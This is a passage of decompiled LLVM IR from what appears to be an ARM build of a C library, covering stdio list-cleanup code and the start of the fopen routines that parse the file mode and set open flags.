  %v0_16040 = phi i32 [ %v0_16040.pre, %dec_label_pc_16070.dec_label_pc_16040_crit_edge ], [ %v0_1603c, %dec_label_pc_16038 ]
  %v1_16040 = inttoptr i32 %v0_16040 to i32*
  %v2_16040 = load i32, i32* %v1_16040, align 4
  store i32 %v2_16040, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16040, i32* %r2.global-to-local, align 4
  %v2_1604c96 = load i32, i32* %v1_16040, align 4
  store i32 %v2_1604c96, i32* %r3.global-to-local, align 4
  %v3_1605098 = icmp uge i32 %v2_1604c96, %v2_16040
  store i1 %v3_1605098, i1* %cpsr_c.global-to-local, align 1
  %v9_16050104 = icmp eq i32 %v2_1604c96, %v2_16040
  br i1 %v9_16050104, label %dec_label_pc_16058, label %dec_label_pc_16070

dec_label_pc_16058:                               ; preds = %dec_label_pc_16040, %dec_label_pc_16058.dec_label_pc_1604c_crit_edge
  %v0_16058105 = phi i32 [ %v1_16050.pre, %dec_label_pc_16058.dec_label_pc_1604c_crit_edge ], [ %v2_16040, %dec_label_pc_16040 ]
  store i32 %v0_16058105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16068 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16068, label %dec_label_pc_1606c, label %dec_label_pc_16058.dec_label_pc_1604c_crit_edge

dec_label_pc_16058.dec_label_pc_1604c_crit_edge:  ; preds = %dec_label_pc_16058
  %v0_1604c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16050.pre = load i32, i32* @r4, align 4
  %v1_1604c = inttoptr i32 %v0_1604c.pre to i32*
  %v2_1604c = load i32, i32* %v1_1604c, align 4
  store i32 %v2_1604c, i32* %r3.global-to-local, align 4
  %v3_16050 = icmp uge i32 %v2_1604c, %v1_16050.pre
  store i1 %v3_16050, i1* %cpsr_c.global-to-local, align 1
  %v9_16050 = icmp eq i32 %v2_1604c, %v1_16050.pre
  br i1 %v9_16050, label %dec_label_pc_16058, label %dec_label_pc_16070

dec_label_pc_1606c:                               ; preds = %dec_label_pc_16058
  %v0_1606c = load i32, i32* @r4, align 4
  store i32 %v0_1606c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16070

dec_label_pc_16070:                               ; preds = %dec_label_pc_16040, %dec_label_pc_16058.dec_label_pc_1604c_crit_edge, %dec_label_pc_1606c
  %v0_16078 = phi i32 [ %v0_1606c, %dec_label_pc_1606c ], [ %v2_1604c96, %dec_label_pc_16040 ], [ %v2_1604c, %dec_label_pc_16058.dec_label_pc_1604c_crit_edge ]
  %v1_16070 = phi i32 [ %v0_1606c, %dec_label_pc_1606c ], [ %v2_16040, %dec_label_pc_16040 ], [ %v1_16050.pre, %dec_label_pc_16058.dec_label_pc_1604c_crit_edge ]
  %v3_16070 = icmp uge i32 %v0_16078, %v1_16070
  store i1 %v3_16070, i1* %cpsr_c.global-to-local, align 1
  %v9_16070 = icmp eq i32 %v0_16078, %v1_16070
  br i1 %v9_16070, label %dec_label_pc_16078, label %dec_label_pc_16070.dec_label_pc_16040_crit_edge

dec_label_pc_16070.dec_label_pc_16040_crit_edge:  ; preds = %dec_label_pc_16070
  %v0_16040.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16040

dec_label_pc_16078:                               ; preds = %dec_label_pc_16070
  %v2_16078 = icmp ne i32 %v1_16070, 0
  store i1 %v2_16078, i1* %cpsr_c.global-to-local, align 1
  %v7_1607c = icmp slt i32 %v1_16070, 2
  br i1 %v7_1607c, label %dec_label_pc_16098, label %dec_label_pc_16080

dec_label_pc_16080:                               ; preds = %dec_label_pc_16078
  %v0_16080 = load i32, i32* @r7, align 4
  store i32 %v0_16080, i32* %r0.global-to-local, align 4
  %v0_16084 = load i32, i32* %r1.global-to-local, align 4
  %v1_16084 = add i32 %v0_16084, 129
  store i32 %v1_16084, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16098

dec_label_pc_16098:                               ; preds = %dec_label_pc_16010, %dec_label_pc_16080, %dec_label_pc_16078
  %v0_16098 = load i32, i32* @r5, align 4
  %v1_16098 = inttoptr i32 %v0_16098 to i16*
  %v2_16098 = load i16, i16* %v1_16098, align 2
  %v3_16098 = zext i16 %v2_16098 to i32
  %v1_1609c = and i32 %v3_16098, 24576
  %v1_160a0 = or i32 %v1_1609c, 48
  store i32 %v1_160a0, i32* %r3.global-to-local, align 4
  %v0_160a4 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_160a4 = icmp eq i32 %v0_160a4, 0
  %v1_160a8 = trunc i32 %v1_160a0 to i16
  store i16 %v1_160a8, i16* %v1_16098, align 2
  br i1 %v2_160a4, label %dec_label_pc_160b0, label %dec_label_pc_16124

dec_label_pc_160b0:                               ; preds = %dec_label_pc_16098
  %v0_160b0 = load i32, i32* @r5, align 4
  %v1_160b0 = add i32 %v0_160b0, 60
  %v2_160b0 = inttoptr i32 %v1_160b0 to i32*
  %v3_160b0 = load i32, i32* %v2_160b0, align 4
  %v1_160b4 = add i32 %v3_160b0, -1
  store i32 %v1_160b4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_160b8 = icmp eq i32 %v1_160b4, 0
  store i32 %v1_160b4, i32* %v2_160b0, align 4
  br i1 %v2_160b8, label %dec_label_pc_160c4, label %dec_label_pc_16124

dec_label_pc_160c4:                               ; preds = %dec_label_pc_160b0
  %v0_160c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_160c4 = load i32, i32* @r5, align 4
  %v2_160c4 = add i32 %v1_160c4, 64
  %v3_160c4 = inttoptr i32 %v2_160c4 to i32*
  store i32 %v0_160c4, i32* %v3_160c4, align 4
  %v0_160c8 = load i32, i32* @r5, align 4
  %v1_160c8 = add i32 %v0_160c8, 56
  store i32 %v1_160c8, i32* @r6, align 4
  br label %dec_label_pc_160cc

dec_label_pc_160cc:                               ; preds = %dec_label_pc_160fc.dec_label_pc_160cc_crit_edge, %dec_label_pc_160c4
  %v0_160d4 = phi i32 [ %v0_160d4.pre, %dec_label_pc_160fc.dec_label_pc_160cc_crit_edge ], [ %v1_160c8, %dec_label_pc_160c4 ]
  %v0_160cc = phi i32 [ %v0_160cc.pre, %dec_label_pc_160fc.dec_label_pc_160cc_crit_edge ], [ %v0_160c8, %dec_label_pc_160c4 ]
  %v1_160cc = add i32 %v0_160cc, 56
  %v2_160cc = inttoptr i32 %v1_160cc to i32*
  %v3_160cc = load i32, i32* %v2_160cc, align 4
  store i32 %v3_160cc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_160d4, i32* %r2.global-to-local, align 4
  %v1_160d882 = inttoptr i32 %v0_160d4 to i32*
  %v2_160d883 = load i32, i32* %v1_160d882, align 4
  store i32 %v2_160d883, i32* %r3.global-to-local, align 4
  %v3_160dc85 = icmp uge i32 %v2_160d883, %v3_160cc
  store i1 %v3_160dc85, i1* %cpsr_c.global-to-local, align 1
  %v9_160dc91 = icmp eq i32 %v2_160d883, %v3_160cc
  br i1 %v9_160dc91, label %dec_label_pc_160e4, label %dec_label_pc_160fc

dec_label_pc_160e4:                               ; preds = %dec_label_pc_160cc, %dec_label_pc_160e4.dec_label_pc_160d8_crit_edge
  %v0_160e492 = phi i32 [ %v1_160dc.pre, %dec_label_pc_160e4.dec_label_pc_160d8_crit_edge ], [ %v3_160cc, %dec_label_pc_160cc ]
  store i32 %v0_160e492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_160f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_160f4, label %dec_label_pc_160f8, label %dec_label_pc_160e4.dec_label_pc_160d8_crit_edge

dec_label_pc_160e4.dec_label_pc_160d8_crit_edge:  ; preds = %dec_label_pc_160e4
  %v0_160d8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_160dc.pre = load i32, i32* @r4, align 4
  %v1_160d8 = inttoptr i32 %v0_160d8.pre to i32*
  %v2_160d8 = load i32, i32* %v1_160d8, align 4
  store i32 %v2_160d8, i32* %r3.global-to-local, align 4
  %v3_160dc = icmp uge i32 %v2_160d8, %v1_160dc.pre
  store i1 %v3_160dc, i1* %cpsr_c.global-to-local, align 1
  %v9_160dc = icmp eq i32 %v2_160d8, %v1_160dc.pre
  br i1 %v9_160dc, label %dec_label_pc_160e4, label %dec_label_pc_160fc

dec_label_pc_160f8:                               ; preds = %dec_label_pc_160e4
  %v0_160f8 = load i32, i32* @r4, align 4
  store i32 %v0_160f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_160fc

dec_label_pc_160fc:                               ; preds = %dec_label_pc_160cc, %dec_label_pc_160e4.dec_label_pc_160d8_crit_edge, %dec_label_pc_160f8
  %v0_16104 = phi i32 [ %v0_160f8, %dec_label_pc_160f8 ], [ %v2_160d883, %dec_label_pc_160cc ], [ %v2_160d8, %dec_label_pc_160e4.dec_label_pc_160d8_crit_edge ]
  %v1_160fc = phi i32 [ %v0_160f8, %dec_label_pc_160f8 ], [ %v3_160cc, %dec_label_pc_160cc ], [ %v1_160dc.pre, %dec_label_pc_160e4.dec_label_pc_160d8_crit_edge ]
  %v3_160fc = icmp uge i32 %v0_16104, %v1_160fc
  store i1 %v3_160fc, i1* %cpsr_c.global-to-local, align 1
  %v9_160fc = icmp eq i32 %v0_16104, %v1_160fc
  br i1 %v9_160fc, label %dec_label_pc_16104, label %dec_label_pc_160fc.dec_label_pc_160cc_crit_edge

dec_label_pc_160fc.dec_label_pc_160cc_crit_edge:  ; preds = %dec_label_pc_160fc
  %v0_160cc.pre = load i32, i32* @r5, align 4
  %v0_160d4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_160cc

dec_label_pc_16104:                               ; preds = %dec_label_pc_160fc
  %v2_16104 = icmp ne i32 %v1_160fc, 0
  store i1 %v2_16104, i1* %cpsr_c.global-to-local, align 1
  %v7_16108 = icmp slt i32 %v1_160fc, 2
  br i1 %v7_16108, label %dec_label_pc_16124, label %dec_label_pc_1610c

dec_label_pc_1610c:                               ; preds = %dec_label_pc_16104
  %v0_1610c = load i32, i32* @r5, align 4
  %v1_1610c = add i32 %v0_1610c, 56
  store i32 %v1_1610c, i32* %r0.global-to-local, align 4
  %v0_16110 = load i32, i32* %r1.global-to-local, align 4
  %v1_16110 = add i32 %v0_16110, 129
  store i32 %v1_16110, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16124

dec_label_pc_16124:                               ; preds = %dec_label_pc_160b0, %dec_label_pc_16098, %dec_label_pc_1610c, %dec_label_pc_16104
  %v0_16124 = load i32, i32* @r5, align 4
  %v1_16124 = inttoptr i32 %v0_16124 to i16*
  %v2_16124 = load i16, i16* %v1_16124, align 2
  %v3_16124 = zext i16 %v2_16124 to i32
  store i32 %v3_16124, i32* %r3.global-to-local, align 4
  %v1_16128 = and i32 %v3_16124, 16384
  %v2_16128 = icmp eq i32 %v1_16128, 0
  br i1 %v2_16128, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_16124
  %v2_1612c = add i32 %v0_16124, 8
  %v3_1612c = inttoptr i32 %v2_1612c to i32*
  %v4_1612c = load i32, i32* %v3_1612c, align 4
  store i32 %v4_1612c, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_16124, %bb48
  %v1_16130 = xor i1 %v2_16128, true
  call void @__pseudo_cond_branch(i1 %v1_16130, i32 ptrtoint (i32* @global_var_1357c.35 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16138 = load i32, i32* @r8, align 4
  %v2_16138 = add i32 %v0_16138, 160
  %v3_16138 = inttoptr i32 %v2_16138 to i32*
  %v4_16138 = load i32, i32* %v3_16138, align 4
  store i32 %v4_16138, i32* @r5, align 4
  %v1_1613c = add i32 %v4_16138, 8
  %v2_1613c = inttoptr i32 %v1_1613c to i32*
  %v3_1613c = load i32, i32* %v2_1613c, align 4
  store i32 %v3_1613c, i32* %r3.global-to-local, align 4
  %v1_16140 = load i32, i32* %sl.global-to-local, align 4
  %v3_16140 = icmp uge i32 %v3_1613c, %v1_16140
  store i1 %v3_16140, i1* %cpsr_c.global-to-local, align 1
  %v9_16140 = icmp eq i32 %v3_1613c, %v1_16140
  br i1 %v9_16140, label %dec_label_pc_16188, label %dec_label_pc_16148

dec_label_pc_16148:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16138, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1615475 = inttoptr i32 %v4_16138 to i32*
  %v2_1615476 = load i32, i32* %v1_1615475, align 4
  store i32 %v2_1615476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1615878 = icmp eq i32 %v2_1615476, 0
  br i1 %v9_1615878, label %dec_label_pc_16160, label %dec_label_pc_16178

dec_label_pc_16160:                               ; preds = %dec_label_pc_16148, %dec_label_pc_16160.dec_label_pc_16154_crit_edge
  %v0_1616079 = phi i32 [ %v1_16158.pre, %dec_label_pc_16160.dec_label_pc_16154_crit_edge ], [ 0, %dec_label_pc_16148 ]
  store i32 %v0_1616079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16170 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16170, label %dec_label_pc_16174, label %dec_label_pc_16160.dec_label_pc_16154_crit_edge

dec_label_pc_16160.dec_label_pc_16154_crit_edge:  ; preds = %dec_label_pc_16160
  %v0_16154.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16158.pre = load i32, i32* @r4, align 4
  %v1_16154 = inttoptr i32 %v0_16154.pre to i32*
  %v2_16154 = load i32, i32* %v1_16154, align 4
  store i32 %v2_16154, i32* %r3.global-to-local, align 4
  %v3_16158 = icmp uge i32 %v2_16154, %v1_16158.pre
  store i1 %v3_16158, i1* %cpsr_c.global-to-local, align 1
  %v9_16158 = icmp eq i32 %v2_16154, %v1_16158.pre
  br i1 %v9_16158, label %dec_label_pc_16160, label %dec_label_pc_16178

dec_label_pc_16174:                               ; preds = %dec_label_pc_16160
  %v0_16174 = load i32, i32* @r4, align 4
  store i32 %v0_16174, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16178

dec_label_pc_16178:                               ; preds = %dec_label_pc_16148, %dec_label_pc_16160.dec_label_pc_16154_crit_edge, %dec_label_pc_16174
  %v0_16178 = phi i32 [ %v0_16174, %dec_label_pc_16174 ], [ %v2_1615476, %dec_label_pc_16148 ], [ %v2_16154, %dec_label_pc_16160.dec_label_pc_16154_crit_edge ]
  %v1_16178 = phi i32 [ %v0_16174, %dec_label_pc_16174 ], [ 0, %dec_label_pc_16148 ], [ %v1_16158.pre, %dec_label_pc_16160.dec_label_pc_16154_crit_edge ]
  %v3_16178 = icmp uge i32 %v0_16178, %v1_16178
  store i1 %v3_16178, i1* %cpsr_c.global-to-local, align 1
  %v9_16178 = icmp eq i32 %v0_16178, %v1_16178
  br i1 %v9_16178, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_16178
  %v1_1617c = load i32, i32* @r5, align 4
  store i32 %v1_1617c, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_16178, %bb50
  %v1_16180 = xor i1 %v9_16178, true
  call void @__pseudo_cond_branch(i1 %v1_16180, i32 ptrtoint (i32* @global_var_14734.518 to i32))
  %v0_16184 = load i32, i32* %sl.global-to-local, align 4
  %v1_16184 = load i32, i32* @r5, align 4
  %v2_16184 = add i32 %v1_16184, 8
  %v3_16184 = inttoptr i32 %v2_16184 to i32*
  store i32 %v0_16184, i32* %v3_16184, align 4
  %v0_1618c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_16188

dec_label_pc_16188:                               ; preds = %bb49, %bb51
  %v0_1618c = phi i32 [ %v0_16138, %bb49 ], [ %v0_1618c.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_1618c = add i32 %v0_1618c, 80
  %v3_1618c = inttoptr i32 %v2_1618c to i32*
  %v4_1618c = load i32, i32* %v3_1618c, align 4
  store i32 %v4_1618c, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_16194 = add i32 %v0_1618c, 160
  %v3_16194 = inttoptr i32 %v2_16194 to i32*
  %v4_16194 = load i32, i32* %v3_16194, align 4
  store i32 %v4_16194, i32* %r0.global-to-local, align 4
  %v1_16198 = inttoptr i32 %v4_1618c to i32*
  %v2_16198 = load i32, i32* %v1_16198, align 4
  store i32 %v2_16198, i32* %r3.global-to-local, align 4
  %v1_1619c = add i32 %v4_16194, 4
  %v2_1619c = inttoptr i32 %v1_1619c to i32*
  %v3_1619c = load i32, i32* %v2_1619c, align 4
  store i32 %v3_1619c, i32* %r1.global-to-local, align 4
  %v1_161a0 = add i32 %v2_16198, 1
  store i32 %v1_161a0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_161a4 = icmp eq i32 %v3_1619c, 0
  store i32 %v1_161a0, i32* %v1_16198, align 4
  br i1 %v2_161a4, label %dec_label_pc_161b0, label %dec_label_pc_16210

dec_label_pc_161b0:                               ; preds = %dec_label_pc_16188
  %v0_161b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_161b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_161b0 = add i32 %v1_161b0, 8
  %v3_161b0 = inttoptr i32 %v2_161b0 to i32*
  store i32 %v0_161b0, i32* %v3_161b0, align 4
  %v0_161b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_161b4, i32* @r5, align 4
  br label %dec_label_pc_161b8

dec_label_pc_161b8:                               ; preds = %dec_label_pc_161e8.dec_label_pc_161b8_crit_edge, %dec_label_pc_161b0
  %v0_161b8 = phi i32 [ %v0_161b8.pre, %dec_label_pc_161e8.dec_label_pc_161b8_crit_edge ], [ %v0_161b4, %dec_label_pc_161b0 ]
  %v1_161b8 = inttoptr i32 %v0_161b8 to i32*
  %v2_161b8 = load i32, i32* %v1_161b8, align 4
  store i32 %v2_161b8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_161b8, i32* %r2.global-to-local, align 4
  %v2_161c464 = load i32, i32* %v1_161b8, align 4
  store i32 %v2_161c464, i32* %r3.global-to-local, align 4
  %v3_161c866 = icmp uge i32 %v2_161c464, %v2_161b8
  store i1 %v3_161c866, i1* %cpsr_c.global-to-local, align 1
  %v9_161c872 = icmp eq i32 %v2_161c464, %v2_161b8
  br i1 %v9_161c872, label %dec_label_pc_161d0, label %dec_label_pc_161e8

dec_label_pc_161d0:                               ; preds = %dec_label_pc_161b8, %dec_label_pc_161d0.dec_label_pc_161c4_crit_edge
  %v0_161d073 = phi i32 [ %v1_161c8.pre, %dec_label_pc_161d0.dec_label_pc_161c4_crit_edge ], [ %v2_161b8, %dec_label_pc_161b8 ]
  store i32 %v0_161d073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_161e0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_161e0, label %dec_label_pc_161e4, label %dec_label_pc_161d0.dec_label_pc_161c4_crit_edge

dec_label_pc_161d0.dec_label_pc_161c4_crit_edge:  ; preds = %dec_label_pc_161d0
  %v0_161c4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_161c8.pre = load i32, i32* @r4, align 4
  %v1_161c4 = inttoptr i32 %v0_161c4.pre to i32*
  %v2_161c4 = load i32, i32* %v1_161c4, align 4
  store i32 %v2_161c4, i32* %r3.global-to-local, align 4
  %v3_161c8 = icmp uge i32 %v2_161c4, %v1_161c8.pre
  store i1 %v3_161c8, i1* %cpsr_c.global-to-local, align 1
  %v9_161c8 = icmp eq i32 %v2_161c4, %v1_161c8.pre
  br i1 %v9_161c8, label %dec_label_pc_161d0, label %dec_label_pc_161e8

dec_label_pc_161e4:                               ; preds = %dec_label_pc_161d0
  %v0_161e4 = load i32, i32* @r4, align 4
  store i32 %v0_161e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_161e8

dec_label_pc_161e8:                               ; preds = %dec_label_pc_161b8, %dec_label_pc_161d0.dec_label_pc_161c4_crit_edge, %dec_label_pc_161e4
  %v0_161f0 = phi i32 [ %v0_161e4, %dec_label_pc_161e4 ], [ %v2_161c464, %dec_label_pc_161b8 ], [ %v2_161c4, %dec_label_pc_161d0.dec_label_pc_161c4_crit_edge ]
  %v1_161e8 = phi i32 [ %v0_161e4, %dec_label_pc_161e4 ], [ %v2_161b8, %dec_label_pc_161b8 ], [ %v1_161c8.pre, %dec_label_pc_161d0.dec_label_pc_161c4_crit_edge ]
  %v3_161e8 = icmp uge i32 %v0_161f0, %v1_161e8
  store i1 %v3_161e8, i1* %cpsr_c.global-to-local, align 1
  %v9_161e8 = icmp eq i32 %v0_161f0, %v1_161e8
  br i1 %v9_161e8, label %dec_label_pc_161f0, label %dec_label_pc_161e8.dec_label_pc_161b8_crit_edge

dec_label_pc_161e8.dec_label_pc_161b8_crit_edge:  ; preds = %dec_label_pc_161e8
  %v0_161b8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_161b8

dec_label_pc_161f0:                               ; preds = %dec_label_pc_161e8
  %v2_161f0 = icmp ne i32 %v1_161e8, 0
  store i1 %v2_161f0, i1* %cpsr_c.global-to-local, align 1
  %v7_161f4 = icmp slt i32 %v1_161e8, 2
  br i1 %v7_161f4, label %dec_label_pc_16210, label %dec_label_pc_161f8

dec_label_pc_161f8:                               ; preds = %dec_label_pc_161f0
  %v0_161f8 = load i32, i32* @r5, align 4
  store i32 %v0_161f8, i32* %r0.global-to-local, align 4
  %v0_161fc = load i32, i32* %r1.global-to-local, align 4
  %v1_161fc = add i32 %v0_161fc, 129
  store i32 %v1_161fc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16210

dec_label_pc_16210:                               ; preds = %dec_label_pc_16188, %dec_label_pc_161f8, %dec_label_pc_161f0
  %v0_16210 = call i32 @_stdio_openlist_dec_use()
  %v0_16214 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_16214, i32* %r0.global-to-local, align 4
  %v2_1621c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1621c, i32* @r4, align 4
  store i32 %v6_15f04, i32* @r5, align 4
  store i32 %v9_15f04, i32* @r6, align 4
  store i32 %v12_15f04, i32* @r7, align 4
  ret i32 %v0_16214

; uselistorder directives
  uselistorder i32 %v0_161e4, { 1, 0, 2 }
  uselistorder i32 %v1_161c8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_161b8, { 1, 0 }
  uselistorder i32 %v0_1618c, { 1, 0 }
  uselistorder i32 %v0_16174, { 1, 0, 2 }
  uselistorder i32 %v1_16158.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16140, { 1, 0 }
  uselistorder i32 %v0_160f8, { 1, 0, 2 }
  uselistorder i32 %v1_160dc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1606c, { 1, 0, 2 }
  uselistorder i32 %v1_16050.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16040, { 1, 0 }
  uselistorder i32 %v0_15ffc, { 1, 0, 2 }
  uselistorder i32 %v1_15fe0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15fc0, { 1, 0 }
  uselistorder i32 %v1_15f4c.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 46, 4, 5, 6, 7, 8, 10, 9, 41, 11, 14, 12, 13, 15, 17, 16, 42, 18, 19, 20, 21, 22, 24, 23, 43, 25, 26, 27, 28, 30, 29, 44, 31, 32, 33, 34, 35, 36, 37, 39, 38, 45, 40 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 4, 5, 34, 35, 6, 7, 8, 30, 31, 9, 10, 11, 12, 32, 33, 13, 14, 15, 16, 18, 17, 1, 19, 20, 22, 21, 0, 23, 24, 25, 27, 26, 2, 28, 29 }
  uselistorder i32 (i32)* @__GI___libc_close, { 29, 27, 26, 33, 32, 25, 31, 30, 24, 2, 28, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_16210, { 1, 2, 0 }
  uselistorder label %dec_label_pc_161e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_161d0, { 1, 0 }
  uselistorder label %dec_label_pc_16188, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_16178, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16160, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_16124, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_160fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_160e4, { 1, 0 }
  uselistorder label %dec_label_pc_16098, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16070, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16058, { 1, 0 }
  uselistorder label %dec_label_pc_16010, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_16000, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15fe8, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_15f88, { 1, 0 }
  uselistorder label %dec_label_pc_15f7c, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_15f6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15f54, { 1, 0 }
}

define i32 @function_16228(i32 %arg1) local_unnamed_addr {
dec_label_pc_16228:
  %v0_16228 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16228, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16228
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16228, %bb
  %v10_16230 = phi i32 [ %arg1, %dec_label_pc_16228 ], [ 0, %bb ]
  ret i32 %v10_16230

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_16244 = call i32 @_stdio_fopen()
  ret i32 %v0_16244
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_16254 = load i32, i32* @r4, align 4
  store i32 %v3_16254, i32* %stack_var_-24, align 4
  %v6_16254 = load i32, i32* @r5, align 4
  %v9_16254 = load i32, i32* @r6, align 4
  %v12_16254 = load i32, i32* @r7, align 4
  %v15_16254 = load i32, i32* @r8, align 4
  %v0_16258 = load i32, i32* @r1, align 4
  %v1_16258 = inttoptr i32 %v0_16258 to i8*
  %v2_16258 = load i8, i8* %v1_16258, align 1
  %v2_16260 = icmp ugt i8 %v2_16258, 113
  store i1 %v2_16260, i1* %cpsr_c.global-to-local, align 1
  %v7_16260 = icmp eq i8 %v2_16258, 114
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r8, align 4
  %v0_1626c = load i32, i32* @r0, align 4
  store i32 %v0_1626c, i32* @r7, align 4
  %v0_16270 = load i32, i32* @r2, align 4
  store i32 %v0_16270, i32* @r5, align 4
  %v0_16274 = load i32, i32* @r3, align 4
  store i32 %v0_16274, i32* @r6, align 4
  br i1 %v7_16260, label %dec_label_pc_162c8, label %dec_label_pc_1627c

dec_label_pc_1627c:                               ; preds = %entry
  %v2_1627c = icmp ugt i8 %v2_16258, 118
  store i1 %v2_1627c, i1* %cpsr_c.global-to-local, align 1
  %v7_1627c = icmp eq i8 %v2_16258, 119
  br i1 %v7_1627c, label %bb, label %dec_label_pc_16288

bb:                                               ; preds = %dec_label_pc_1627c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_162cc

dec_label_pc_16288:                               ; preds = %dec_label_pc_1627c
  %v2_16288 = icmp ugt i8 %v2_16258, 96
  store i1 %v2_16288, i1* %cpsr_c.global-to-local, align 1
  %v7_16288 = icmp eq i8 %v2_16258, 97
  br i1 %v7_16288, label %bb49, label %dec_label_pc_16294

bb49:                                             ; preds = %dec_label_pc_16288
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_162cc

dec_label_pc_16294:                               ; preds = %dec_label_pc_16288, %dec_label_pc_16364, %dec_label_pc_16338
  store i32 49032, i32* %r2.global-to-local, align 4
  %v0_16298 = call i32 @__aeabi_read_tp()
